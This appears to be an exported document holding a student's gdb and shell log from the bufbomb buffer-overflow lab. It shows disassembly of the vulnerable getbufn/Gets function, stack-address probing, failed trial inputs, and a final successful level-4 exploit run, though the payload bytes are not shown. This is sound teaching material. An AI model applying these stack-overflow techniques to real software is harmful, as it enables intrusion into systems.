      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049098 &lt;+432&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909b &lt;+435&gt;:<text:tab/>cmp <text:s text:c="3"/>%edi,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909d &lt;+437&gt;:<text:tab/>jl <text:s text:c="4"/>0x8049084 &lt;main+412&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909f &lt;+439&gt;:<text:tab/>mov <text:s text:c="3"/>0x14(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a3 &lt;+443&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a8 &lt;+448&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490cd &lt;main+485&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490aa &lt;+450&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490af &lt;+455&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b1 &lt;+457&gt;:<text:tab/>add <text:s text:c="3"/>(%esi,%ebx,4),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b4 &lt;+460&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b8 &lt;+464&gt;:<text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="Standard">=&gt; 0x080490bc &lt;+468&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bf &lt;+471&gt;:<text:tab/>call <text:s text:c="2"/>0x8048e17 &lt;launcher&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c4 &lt;+476&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c7 &lt;+479&gt;:<text:tab/>cmp <text:s text:c="3"/>0x1c(%esp),%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cb &lt;+483&gt;:<text:tab/>jl <text:s text:c="4"/>0x80490af &lt;main+455&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cd &lt;+485&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d2 &lt;+490&gt;:<text:tab/>add <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d5 &lt;+493&gt;:<text:tab/>pop <text:s text:c="3"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d6 &lt;+494&gt;:<text:tab/>pop <text:s text:c="3"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d7 &lt;+495&gt;:<text:tab/>pop <text:s text:c="3"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d8 &lt;+496&gt;:<text:tab/>mov <text:s text:c="3"/>%ebp,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490da &lt;+498&gt;:<text:tab/>pop <text:s text:c="3"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490db &lt;+499&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $esp</text:p>
      <text:p text:style-name="Standard">0xbffff0b0:<text:tab/>0x00000005</text:p>
      <text:p text:style-name="Standard">(gdb) x $eax</text:p>
      <text:p text:style-name="Standard">0x1:<text:tab/>Cannot access memory at address 0x1</text:p>
      <text:p text:style-name="Standard">(gdb) print *(int *) $esp</text:p>
      <text:p text:style-name="Standard">$1 = 5</text:p>
      <text:p text:style-name="Standard">(gdb) print (int *) $esp</text:p>
      <text:p text:style-name="Standard">$2 = (int *) 0xbffff0b0</text:p>
      <text:p text:style-name="Standard">(gdb) x *0x804b1d4</text:p>
      <text:p text:style-name="Standard">0x0:<text:tab/>Cannot access memory at address 0x0</text:p>
      <text:p text:style-name="Standard">(gdb) x 0x804b1d4</text:p>
      <text:p text:style-name="Standard">0x804b1d4 &lt;global_nitro&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) x 0x804b1d4</text:p>
      <text:p text:style-name="Standard">0x804b1d4 &lt;global_nitro&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) x 0x804b1d8</text:p>
      <text:p text:style-name="Standard">0x804b1d8 &lt;global_offset&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) x 0x55586000</text:p>
      <text:p text:style-name="Standard">0x55586000 &lt;_reserved&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) x 0xdeadbeef</text:p>
      <text:p text:style-name="Standard">0xdeadbeef:<text:tab/>Cannot access memory at address 0xdeadbeef</text:p>
      <text:p text:style-name="Standard">(gdb)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~$ cd Desktop/</text:p>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop$ cd lab3/</text:p>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb</text:p>
      <text:p text:style-name="Standard">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</text:p>
      <text:p text:style-name="Standard">Copyright (C) 2014 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="Standard">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="Standard">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="Standard">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="Standard">and "show warranty" for details.</text:p>
      <text:p text:style-name="Standard">This GDB was configured as "i686-linux-gnu".</text:p>
      <text:p text:style-name="Standard">Type "show configuration" for configuration details.</text:p>
      <text:p text:style-name="Standard">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</text:p>
      <text:p text:style-name="Standard">Find the GDB manual and other documentation resources online at:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</text:p>
      <text:p text:style-name="Standard">For help, type "help".</text:p>
      <text:p text:style-name="Standard">Type "apropos word" to search for commands related to "word"...</text:p>
      <text:p text:style-name="Standard">Reading symbols from bufbomb...done.</text:p>
      <text:p text:style-name="Standard">(gdb) b getbufn</text:p>
      <text:p text:style-name="Standard">Breakpoint 1 at 0x8048c8f</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function getbufn:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c86 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c87 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c89 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x218,%esp</text:p>
      <text:p text:style-name="Standard">=&gt; 0x08048c8f &lt;+9&gt;:<text:tab/>lea <text:s text:c="3"/>-0x208(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c95 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c98 &lt;+18&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c9d &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca2 &lt;+28&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca3 &lt;+29&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x %ebp-0x208</text:p>
      <text:p text:style-name="Standard">A syntax error in expression, near `%ebp-0x208'.</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">The program being debugged has been started already.</text:p>
      <text:p text:style-name="Standard">Start it from the beginning? (y or n) y</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">The program being debugged has been started already.</text:p>
      <text:p text:style-name="Standard">Start it from the beginning? (y or n) y</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:asdfadsfasdfsaf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208 &lt;_reserved+1036808&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) q</text:p>
      <text:p text:style-name="Standard">A debugging session is active.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Inferior 1 [process 4045] will be killed.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Quit anyway? (y or n) y</text:p>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb</text:p>
      <text:p text:style-name="Standard">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1</text:p>
      <text:p text:style-name="Standard">Copyright (C) 2014 Free Software Foundation, Inc.</text:p>
      <text:p text:style-name="Standard">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</text:p>
      <text:p text:style-name="Standard">This is free software: you are free to change and redistribute it.</text:p>
      <text:p text:style-name="Standard">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying"</text:p>
      <text:p text:style-name="Standard">and "show warranty" for details.</text:p>
      <text:p text:style-name="Standard">This GDB was configured as "i686-linux-gnu".</text:p>
      <text:p text:style-name="Standard">Type "show configuration" for configuration details.</text:p>
      <text:p text:style-name="Standard">For bug reporting instructions, please see:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</text:p>
      <text:p text:style-name="Standard">Find the GDB manual and other documentation resources online at:</text:p>
      <text:p text:style-name="Standard">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</text:p>
      <text:p text:style-name="Standard">For help, type "help".</text:p>
      <text:p text:style-name="Standard">Type "apropos word" to search for commands related to "word"...</text:p>
      <text:p text:style-name="Standard">Reading symbols from bufbomb...done.</text:p>
      <text:p text:style-name="Standard">(gdb) b getbufn</text:p>
      <text:p text:style-name="Standard">Breakpoint 1 at 0x8048c8f</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function getbufn:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c86 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c87 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c89 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x218,%esp</text:p>
      <text:p text:style-name="Standard">=&gt; 0x08048c8f &lt;+9&gt;:<text:tab/>lea <text:s text:c="3"/>-0x208(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c95 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c98 &lt;+18&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c9d &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca2 &lt;+28&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca3 &lt;+29&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abc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208 &lt;_reserved+1036808&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcd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158 &lt;_reserved+1036632&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcde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178 &lt;_reserved+1036664&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdef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128 &lt;_reserved+1036584&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefg</text:p>
      <text:p text:style-name="Standard">Dud: getbufn returned 0x1</text:p>
      <text:p text:style-name="Standard">Better luck next time</text:p>
      <text:p text:style-name="Standard">[Inferior 1 (process 4054) exited normally]</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">No registers.</text:p>
      <text:p text:style-name="Standard">(gdb) r -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 -n</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function getbufn:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c86 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c87 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c89 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x218,%esp</text:p>
      <text:p text:style-name="Standard">=&gt; 0x08048c8f &lt;+9&gt;:<text:tab/>lea <text:s text:c="3"/>-0x208(%ebp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c95 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c98 &lt;+18&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048c9d &lt;+23&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca2 &lt;+28&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ca3 &lt;+29&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683198 &lt;_reserved+1036696&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefgh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208 &lt;_reserved+1036808&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghi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158 &lt;_reserved+1036632&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghij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178 &lt;_reserved+1036664&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghijk</text:p>
      <text:p text:style-name="Standard">Dud: getbufn returned 0x1</text:p>
      <text:p text:style-name="Standard">Better luck next time</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Breakpoint 1, 0x08048c8f in getbufn ()</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">0x55683128 &lt;_reserved+1036584&gt;:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) continue</text:p>
      <text:p text:style-name="Standard">Continuing.</text:p>
      <text:p text:style-name="Standard">Type string:abcdefghijk</text:p>
      <text:p text:style-name="Standard">Dud: getbufn returned 0x1</text:p>
      <text:p text:style-name="Standard">Better luck next time</text:p>
      <text:p text:style-name="Standard">[Inferior 1 (process 4069) exited normally]</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebp-0x208</text:p>
      <text:p text:style-name="Standard">No registers.</text:p>
      <text:p text:style-name="Standard">(gdb)</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c source4.s</text:p>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d source4.o &gt; source4.d</text:p>
      <text:p text:style-name="Standard">chenzhongyu@ubuntu:~/Desktop/lab3$ cat level4.txt | ./hex2raw -n | ./bufbomb -n -u 16307130194</text:p>
      <text:p text:style-name="Standard">Userid: 16307130194</text:p>
      <text:p text:style-name="Standard">Cookie: 0x759069aa</text:p>
      <text:p text:style-name="Standard">Type string:KABOOM!: getbufn returned 0x759069aa</text:p>
      <text:p text:style-name="Standard">Keep going</text:p>
      <text:p text:style-name="Standard">Type string:KABOOM!: getbufn returned 0x759069aa</text:p>
      <text:p text:style-name="Standard">Keep going</text:p>
      <text:p text:style-name="Standard">Type string:KABOOM!: getbufn returned 0x759069aa</text:p>
      <text:p text:style-name="Standard">Keep going</text:p>
      <text:p text:style-name="Standard">Type string:KABOOM!: getbufn returned 0x759069aa</text:p>
      <text:p text:style-name="Standard">Keep going</text:p>
      <text:p text:style-name="Standard">Type string:KABOOM!: getbufn returned 0x759069aa</text:p>
      <text:p text:style-name="Standard">VALID</text:p>
      <text:p text:style-name="Standard">NICE JOB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等线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用户</dc:creator>
    <meta:creation-date>2017-11-02T10:43:00Z</meta:creation-date>
    <dc:date>2017-11-09T08:28:00Z</dc:date>
    <meta:template xlink:href="Normal" xlink:type="simple"/>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:editing-duration>PT475740S</meta:editing-duration>
    <meta:document-statistic meta:page-count="1" meta:paragraph-count="2181" meta:word-count="9114" meta:character-count="32728" meta:row-count="2866" meta:non-whitespace-character-count="25795"/>
  </office:meta>
</office:document-meta>
</file>